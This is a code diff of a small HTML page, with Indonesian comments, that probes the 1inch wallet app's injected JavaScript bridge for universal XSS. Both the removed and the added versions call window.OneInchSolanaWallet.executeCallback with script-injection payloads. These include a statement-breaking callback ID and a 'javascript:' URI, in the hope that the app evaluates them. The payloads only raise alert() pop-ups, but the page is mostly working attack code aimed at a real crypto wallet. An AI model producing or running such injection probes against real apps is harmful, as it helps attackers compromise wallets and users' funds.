@@ -1,35 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>🚀 Menjalankan Exploit pada 1inch...</h3>
-    <div id="logs"></div>
+    <h3>Fuzzing executeCallback...</h3>
+    <div id="status">Menjalankan percobaan...</div>
 
     <script>
-        const log = (m) => document.getElementById('logs').innerHTML += `> ${m}<br>`;
-        
-        // Kita targetkan Class yang sudah kamu temukan
-        const Bridge = window.OneInchSolanaWallet;
+        const target = window.OneInchSolanaWallet;
+        const msg = (t) => document.getElementById('status').innerText = t;
 
-        if (Bridge && Bridge.executeCallback) {
-            log("Fungsi executeCallback Ditemukan! Mengirim Payload...");
-
+        if (target && target.executeCallback) {
             try {
-                // Skenario 1: Mencoba injeksi via ID callback
-                // Kita berharap sistem melakukan: eval("callback_" + id)
-                const payloadJahat = "1; alert('BOOM! UXSS 1inch Berhasil!'); //";
+                // Mencoba berbagai variasi payload yang sering tembus di bridge mobile
+                const payloads = [
+                    { id: "1", data: { result: "alert('UXSS_1')" } },
+                    { id: "javascript:alert('UXSS_2')", data: {} },
+                    { id: "1", data: "alert('UXSS_3')" }
+                ];
+
+                payloads.forEach(p => {
+                    // Coba panggil dengan parameter id dan data
+                    target.executeCallback(p.id, p.data);
+                });
                 
-                log("Mencoba Injeksi Callback ID...");
-                Bridge.executeCallback(payloadJahat, {status: "success"});
-
-                // Skenario 2: Mencoba injeksi via data object
-                log("Mencoba Injeksi via Data Object...");
-                Bridge.executeCallback("any_id", "alert('UXSS via Data!')");
-
+                msg("Payload terkirim. Cek apakah ada pop-up.");
             } catch(e) {
-                log("Error saat eksekusi: " + e.message);
+                msg("Error: " + e.message);
             }
         } else {
-            log("Fungsi target tidak merespon. Coba refresh.");
+            msg("Fungsi executeCallback tidak ditemukan.");
         }
     </script>
 </body>
